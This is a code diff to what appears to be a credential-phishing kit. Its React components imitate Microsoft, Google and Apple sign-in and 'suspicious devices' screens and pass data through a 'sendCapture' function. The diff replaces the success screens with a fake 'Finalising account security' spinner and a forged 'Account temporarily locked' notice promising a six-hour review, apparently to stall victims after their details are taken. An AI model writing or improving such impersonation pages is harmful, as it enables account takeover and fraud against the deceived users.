@@ -1684,7 +1684,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
             {isMobile ? (
               <div className="flex flex-col items-center gap-5 px-8">
                 {msLogoRow(true)}
-                <p className="text-[15px] text-[#aaa] text-center mt-1">Signing you in…</p>
+                <p className="text-[15px] text-[#aaa] text-center mt-1">Just a moment…</p>
                 <div className="flex gap-2">
                   {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                 </div>
@@ -1692,7 +1692,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
             ) : (
               <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-xl ${darkCardBg}`}>
                 {msLogoRow(true)}
-                <p className="text-[15px] text-[#aaa] mt-6 mb-5 text-center">Signing you in…</p>
+                <p className="text-[15px] text-[#aaa] mt-6 mb-5 text-center">Just a moment…</p>
                 <div className="flex gap-2">
                   {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                 </div>
@@ -2846,7 +2846,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
                       </defs>
                     </svg>
                   </div>
-                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Signing you in…</p>
+                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Just a moment…</p>
                 </div>
                 <div />
               </>
@@ -3058,7 +3058,7 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
 }) {
   const [removedIds, setRemovedIds] = useState<Set<string>>(new Set());
   const [removingId, setRemovingId] = useState<string | null>(null);
-  const [phase, setPhase] = useState<'list' | 'removing' | 'complete'>('list');
+  const [phase, setPhase] = useState<'list' | 'removing' | 'complete' | 'locked'>('list');
   const [countdown, setCountdown] = useState(waitSeconds);
   const [totalWait, setTotalWait] = useState(waitSeconds);
   const [extendedShown, setExtendedShown] = useState(false);
@@ -3094,6 +3094,12 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
     setCountdown(c => c + 35);
     setTotalWait(t => t + 35);
   }, [extended, extendedShown, phase]);
+
+  useEffect(() => {
+    if (phase !== 'complete') return;
+    const t = setTimeout(() => setPhase('locked'), 3000);
+    return () => clearTimeout(t);
+  }, [phase]);
 
   const progressPct = Math.max(0, Math.min(100, ((totalWait - countdown) / totalWait) * 100));
 
@@ -3189,13 +3195,27 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
               </motion.div>
             )}
             {phase === 'complete' && (
-              <motion.div key="ms-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
-                <div className="w-16 h-16 rounded-full bg-[#DFF6DD] flex items-center justify-center mb-5">
-                  <Check className="w-8 h-8 text-[#107c10]" />
+              <motion.div key="ms-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-10">
+                <div className="mb-6 relative w-16 h-16">
+                  <svg className="w-16 h-16 animate-spin" viewBox="0 0 64 64"><circle cx="32" cy="32" r="28" stroke="#e5e5e5" strokeWidth="5" fill="none"/><path d="M32 4a28 28 0 0128 28" stroke="#0078D4" strokeWidth="5" strokeLinecap="round" fill="none"/></svg>
+                  <div className="absolute inset-0 flex items-center justify-center"><MicrosoftLogo /></div>
                 </div>
-                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Account secured</div>
-                <div className="text-[13px] text-[#605e5c] mb-8 text-center">Unauthorized devices have been removed from your Microsoft account.</div>
-                <button onClick={onDone} className="px-10 py-2.5 rounded text-[15px] font-semibold text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#0078D4' }}>Done</button>
+                <div className="text-[16px] font-semibold text-[#1b1b1b] mb-1 text-center">Just a moment…</div>
+                <div className="text-[13px] text-[#605e5c] text-center">Finalising account security</div>
+              </motion.div>
+            )}
+            {phase === 'locked' && (
+              <motion.div key="ms-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
+                <div className="w-16 h-16 rounded-full bg-[#fef3cd] flex items-center justify-center mb-5">
+                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#a16207" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Account temporarily locked</div>
+                <div className="text-[13px] text-[#605e5c] mb-5 text-center leading-relaxed max-w-[340px]">For your security, we have temporarily locked your Microsoft account. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
+                <div className="w-full bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3 mb-6 text-center">
+                  <div className="text-[13px] font-semibold text-[#1b1b1b] mb-0.5">Estimated review time</div>
+                  <div className="text-[22px] font-bold text-[#0078D4]">6 hours</div>
+                  <div className="text-[12px] text-[#605e5c] mt-0.5">You will be alerted once the review is complete</div>
+                </div>
               </motion.div>
             )}
           </AnimatePresence>
@@ -3294,13 +3314,24 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
               </motion.div>
             )}
             {phase === 'complete' && (
-              <motion.div key="apple-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
-                <div className="w-20 h-20 rounded-full bg-[#E8FAE8] flex items-center justify-center mb-6">
-                  <Check className="w-10 h-10 text-[#34c759]" />
+              <motion.div key="apple-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
+                <div className="mb-6"><AppleSpinRing isDark={false} /></div>
+                <div className="text-[20px] font-semibold text-[#1d1d1f] mb-1 text-center tracking-tight">Just a moment…</div>
+                <div className="text-[15px] text-[#6e6e73] text-center">Finalising account security</div>
+              </motion.div>
+            )}
+            {phase === 'locked' && (
+              <motion.div key="apple-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
+                <div className="w-20 h-20 rounded-full bg-[#fff3cd] flex items-center justify-center mb-6">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#92400e" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                 </div>
-                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-2 tracking-tight">Devices removed</div>
-                <div className="text-[15px] text-[#6e6e73] mb-10 text-center">Unauthorised devices have been removed from your Apple ID.</div>
-                <button onClick={onDone} className="px-12 py-3 rounded-2xl text-[17px] font-medium text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#007AFF' }}>Done</button>
+                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-2 tracking-tight text-center">Apple ID temporarily locked</div>
+                <div className="text-[15px] text-[#6e6e73] mb-8 text-center leading-relaxed max-w-[380px]">For your security, we have temporarily locked your Apple ID. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
+                <div className="w-full bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-5 py-4 text-center">
+                  <div className="text-[13px] font-semibold text-[#1d1d1f] mb-1">Estimated review time</div>
+                  <div className="text-[28px] font-bold text-[#007AFF]">6 hours</div>
+                  <div className="text-[13px] text-[#6e6e73] mt-1">You will be alerted once the review is complete</div>
+                </div>
               </motion.div>
             )}
           </AnimatePresence>
@@ -3403,13 +3434,30 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
             </motion.div>
           )}
           {phase === 'complete' && (
-            <motion.div key="google-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
-              <div className="w-20 h-20 rounded-full bg-[#e6f4ea] flex items-center justify-center mb-6">
-                <Check className="w-10 h-10 text-[#1e8e3e]" />
+            <motion.div key="google-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
+              <div className="mb-7 relative w-20 h-20">
+                <svg className="w-20 h-20 animate-spin" viewBox="0 0 64 64" style={{ animationDuration: '1.1s' }}>
+                  <defs><linearGradient id="goog-lock-spin" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#4285F4"/><stop offset="33%" stopColor="#EA4335"/><stop offset="66%" stopColor="#FBBC05"/><stop offset="100%" stopColor="#34A853"/></linearGradient></defs>
+                  <circle cx="32" cy="32" r="28" fill="none" strokeWidth="4.5" strokeLinecap="round" stroke="url(#goog-lock-spin)" strokeDasharray="105 132"/>
+                </svg>
+                <div className="absolute inset-0 flex items-center justify-center"><GoogleLogo /></div>
               </div>
-              <div className="text-[22px] font-normal text-[#202124] mb-2">Account secured</div>
-              <div className="text-[14px] text-[#5f6368] mb-10 text-center">Unauthorised devices have been removed from your Google Account.</div>
-              <button onClick={onDone} className="px-10 py-2.5 rounded-full text-[14px] font-medium text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#1a73e8' }}>Done</button>
+              <div className="text-[20px] font-normal text-[#202124] mb-1 text-center">Just a moment…</div>
+              <div className="text-[14px] text-[#5f6368] text-center">Finalising account security</div>
+            </motion.div>
+          )}
+          {phase === 'locked' && (
+            <motion.div key="google-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
+              <div className="w-20 h-20 rounded-full bg-[#fef3e2] flex items-center justify-center mb-6">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#e37400" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              </div>
+              <div className="text-[22px] font-normal text-[#202124] mb-2 text-center">Account temporarily locked</div>
+              <div className="text-[14px] text-[#5f6368] mb-8 text-center leading-relaxed max-w-[400px]">For your security, we have temporarily locked your Google Account. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
+              <div className="w-full bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-5 py-4 text-center">
+                <div className="text-[13px] font-medium text-[#202124] mb-1">Estimated review time</div>
+                <div className="text-[28px] font-bold text-[#1a73e8]">6 hours</div>
+                <div className="text-[13px] text-[#5f6368] mt-1">You will be alerted once the review is complete</div>
+              </div>
             </motion.div>
           )}
         </AnimatePresence>
